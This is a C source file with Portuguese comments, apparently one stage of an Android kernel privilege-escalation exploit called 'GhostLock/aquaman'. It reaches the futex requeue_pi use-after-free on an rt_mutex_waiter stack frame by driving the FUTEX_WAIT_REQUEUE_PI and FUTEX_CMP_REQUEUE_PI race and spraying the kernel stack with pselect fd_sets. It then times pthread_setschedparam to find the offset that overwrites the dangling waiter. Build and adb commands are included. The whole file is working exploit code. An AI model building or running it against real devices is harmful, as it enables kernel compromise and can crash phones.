/*
 * ghostlock_stack_cal.c — calibracao do reclaim de stack (GhostLock/aquaman).
 *
 * Pergunta: qual profundidade de stack de usuario faz o carimbo de pselect()
 * sobrepor o rt_mutex_waiter (frame de futex_wait_requeue_pi) do waiter?
 *
 * Mecanica
 * --------
 * O consumer (pthread_setschedparam no waiter) chama rt_mutex_get_effective_prio
 * (medido no asm do lab build):
 *     if (task->pi_waiters == NULL) return oldprio;             // frame intocado
 *     t = *(&task->pi_waiters_leftmost->pi_tree_entry + 0x18);  // waiter->task
 *     return min(t->prio, oldprio);
 * ou seja, ele DESREFERENCIA waiter->task (offset 0x30 no frame) e le
 * task->prio.
 *
 *   frame intacto : waiter->task == current -> prio ~120 > 99 -> caller entra
 *                   no caminho RT e o walk em rt_mutex_slowlock chama
 *                   schedule() -> stall de ~60s. Baseline ja medido no
 *                   aparelho.
 *   frame carimbado com PAGE_OFFSET: le int da RAM fisica (tipicamente < 99)
 *                   -> caminho rapido, sem stall, sem oops.
 *
 * Por que PAD >= 0x120 e nao zero
 * ------------------------------
 * O rt_mutex fica dentro do frame do waiter (futex_requeue usa
 * &requeue_pi.waiter, e o rt_waiter e vizinho). O consumer NUNCA alcanca
 * esse offset: ele so le task->pi_waiters / task->pi_waiters_leftmost, que
 * estao no task_struct. Carimbar o rt_mutex e o que quebra a vida; entao a
 * janela util comeca DEPOIS do rt_mutex e vai ate waiter+0x50. Isso da o
 * intervalo [0x120, 0x1c0] abaixo. Carimbo antes disso corrompe o lock e o
 * dispositivo morre: por isso a varredura comeca em 0x120, nunca em 0.
 *
 * Por que dois pselect
 * --------------------
 * core_sys_select tem 6 slots de 40B: 3 copiados do usuario (in/out/except)
 * e 3 zerados com memset (res_in/res_out/res_ex). Se o waiter cair num slot
 * memset, waiter->task = 0 -> desref em 0x68 -> oops. Solucao: um segundo
 * pselect 0x78 bytes MAIS RASO cobre exatamente os 3 slots que o primeiro
 * zerou. Ordem: pselect PROFUNDO primeiro, RASO depois.
 *
 * Risco: baixo. Nenhum objeto do kernel e reclaimado para explore, nada e
 * escrito em cred/SELinux/funcptr, o consumer so le um int. Os PADs fora da
 * janela sao inertes (frame intocado) ou corrompem o rt_mutex (panic). Por
 * isso a varredura comeca em GL_PSELECT_SHIFT_MIN.
 *
 * Build (NDK r29, ARM64, API 28):
 *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/\
 *     aarch64-linux-android28-clang -O2 -Wall -Wextra -static \
 *     ghostlock_stack_cal.c -o ghostlock_stack_cal
 * Run:
 *   adb push ghostlock_stack_cal /data/local/tmp/
 *   adb shell /data/local/tmp/ghostlock_stack_cal [pad_min] [pad_max] [trials]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "ghostlock_target.h"

#ifndef __NR_futex
#define __NR_futex 98
#endif
#define FUTEX_LOCK_PI            6
#define FUTEX_UNLOCK_PI          7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG       128
#define EDEADLK                  35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

#define STAMP_WORD  GL_PAGE_OFFSET
#define MAX_PAD     4096

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started;
static volatile uint64_t pat_len;
static volatile int release_waiter;
static pthread_t waiter_tid;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

__attribute__((noinline)) static void spin_ns(uint64_t ns) {
    uint64_t t0 = now_ns();
    while (now_ns() - t0 < ns)
        __asm__ volatile("" ::: "memory");
}

/* um pselect: 3 fd_sets de GL_PSEL_SIZE bytes, todas com pattern.
 * nfds=GL_PSEL_MAX_NFDS e o que mantem size no stack (size <= 0x2a). */
__attribute__((noinline)) static void psel_once(void) {
    static uint64_t pat[3 * GL_PSEL_SIZE / 8] __attribute__((aligned(64)));
    fd_set *sets = (fd_set *)pat;
    struct timespec ts = { 0, 0 };
    size_t i;

    for (i = 0; i < sizeof(pat) / sizeof(pat[0]); i++)
        pat[i] = STAMP_WORD;

    pselect(GL_PSEL_MAX_NFDS, &sets[0], &sets[1], &sets[2], &ts, NULL);
}

/* carimbo duplo: profundo (escreve pattern em [A, A+0x78) e zero em
 * [A+0x78, A+0xf0)) e depois raso (escreve pattern em [A+0x78, A+0xf0)).
 * Resultado: [A, A+0xf0) todo com pattern. */
__attribute__((noinline)) static void stamp(uint64_t pad) {
    volatile uint8_t deep_vla[MAX_PAD];
    volatile uint8_t shallow_vla[MAX_PAD];
    uint64_t dp = pad < MAX_PAD ? pad : MAX_PAD;
    uint64_t sp = (pad > GL_PSEL_SLOT3_OFF) ? pad - GL_PSEL_SLOT3_OFF : 0;

    memset((void *)deep_vla, 0, dp);
    __asm__ volatile("" ::"r"(deep_vla) : "memory");
    psel_once();

    memset((void *)shallow_vla, 0, sp);
    __asm__ volatile("" ::"r"(shallow_vla) : "memory");
    psel_once();

    __asm__ volatile("" ::"r"(deep_vla), "r"(shallow_vla) : "memory");
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    w_done = 1;

    stamp(pat_len);
    while (!release_waiter)   /* spin puro: nenhum syscall, preserva o carimbo */
        spin_ns(1000000);
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0))
        return NULL;
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock por design */
    return NULL;
}

struct trial_res {
    int stalled;
    uint32_t prio;
    uint64_t us;
};

static int run_trial(uint64_t pad, int with_cmp, struct trial_res *out) {
    f_wait = f_target = f_chain = 0;
    w_ready = w_waiting = w_done = o_started = 0;
    release_waiter = 0;
    pat_len = pad;

    pthread_t w, o;
    if (pthread_create(&w, NULL, waiter_fn, NULL))
        return -100;
    waiter_tid = w;
    if (pthread_create(&o, NULL, owner_fn, NULL))
        return -101;
    while (!w_waiting || !o_started)
        usleep(1000);

    if (with_cmp) {
        usleep(200000);
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        if (errno != EDEADLK) {
            release_waiter = 1;
            xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
            pthread_join(w, NULL);
            return -102;
        }
    } else {
        usleep(1300000);   /* waiter acorda por timeout, teardown limpo */
    }

    xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
    pthread_join(o, NULL);

    int spins = 0;
    while (!w_done && spins++ < 250)
        usleep(20000);
    if (!w_done) {
        release_waiter = 1;
        return -103;
    }

    struct sched_param p = { .sched_priority = 0 };
    uint64_t t0 = now_ns();
    errno = 0;
    int r = pthread_setschedparam(waiter_tid, SCHED_BATCH, &p);
    uint64_t dt = now_ns() - t0;

    out->prio = (uint32_t)r;
    out->us = dt / 1000;
    out->stalled = (dt > 1000000ULL);

    release_waiter = 1;
    pthread_join(w, NULL);
    return 0;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);   /* panic mata o buffer libc: sem evidencia */

    uint64_t pad_min = GL_PSELECT_SHIFT_MIN;
    uint64_t pad_max = GL_PSELECT_SHIFT_MAX;
    uint64_t step     = 0x08;
    int max_trials    = 200;

    if (argc > 1) pad_min = strtoull(argv[1], NULL, 0);
    if (argc > 2) pad_max = strtoull(argv[2], NULL, 0);
    if (argc > 3) max_trials = atoi(argv[3]);

    printf("[info] page_offset=0x%llx stamp_word=0x%llx\n",
           (unsigned long long)GL_PAGE_OFFSET,
           (unsigned long long)STAMP_WORD);
    printf("[info] pselect nfds=%d size=%#x slots=%d span=%#x (stack, nao kmalloc)\n",
           GL_PSEL_MAX_NFDS, GL_PSEL_SIZE, GL_STACK_FDS_SLOTS, GL_PSEL_SPAN);
    printf("[info] lab: waiter_off_sp=%#llx stack_fds_off_sp=%#llx slot3=%#x\n",
           (unsigned long long)GL_WAITER_OFF_SP,
           (unsigned long long)GL_STACK_FDS_OFF_SP, GL_PSEL_SLOT3_OFF);
    printf("[info] varredura pad=[%#llx..%#llx] step=%#llx trials=%d\n",
           (unsigned long long)pad_min, (unsigned long long)pad_max,
           (unsigned long long)step, max_trials);

    {
        struct trial_res r = { 0, 0, 0 };
        if (run_trial(0, 0, &r) < 0) {
            printf("[baseline] trial falhou\n");
            return 3;
        }
        printf("[baseline] stalled=%d prio=%u us=%llu  (%s)\n", r.stalled,
               r.prio, (unsigned long long)r.us,
               r.stalled ? "STALL: frame intacto, esperado"
                         : "rapido: baseline inesperado, revisar consumer");
    }

    int hits = 0, trial = 0;
    uint64_t first_hit = 0, last_hit = 0;

    for (uint64_t pad = pad_min; pad <= pad_max && trial < max_trials;
         pad += step, trial++) {
        struct trial_res r = { 0, 0, 0 };
        int rc = run_trial(pad, 1, &r);
        if (rc < 0) {
            printf("[pad %#llx] trial falhou rc=%d, para\n",
                   (unsigned long long)pad, rc);
            break;
        }
        if (!r.stalled) {
            if (!hits)
                first_hit = pad;
            last_hit = pad;
            hits++;
            printf("[pad %#llx] ACERTO consumer rapido prio=%u us=%llu\n",
                   (unsigned long long)pad, r.prio, (unsigned long long)r.us);
        } else {
            printf("[pad %#llx] stall, frame intocado (us=%llu)\n",
                   (unsigned long long)pad, (unsigned long long)r.us);
        }
    }

    printf("[summary] hits=%d first=%#llx last=%#llx\n", hits,
           (unsigned long long)first_hit, (unsigned long long)last_hit);
    if (!hits) {
        printf("[verdict] nenhum PAD acertou: o aparelho diverge do lab "
               "(WAITER_OFF ou frame de core_sys_select). Trocar stamper: "
               "setsockopt IPV6 MCAST_JOIN_SOURCE_GROUP ou sendmsg, e "
               "recalibrar a faixa.\n");
        return 1;
    }
    printf("[verdict] PSELECT_SHIFT = %#llx, janela %#llx..%#llx\n",
           (unsigned long long)first_hit, (unsigned long long)first_hit,
           (unsigned long long)last_hit);
    return 0;
}
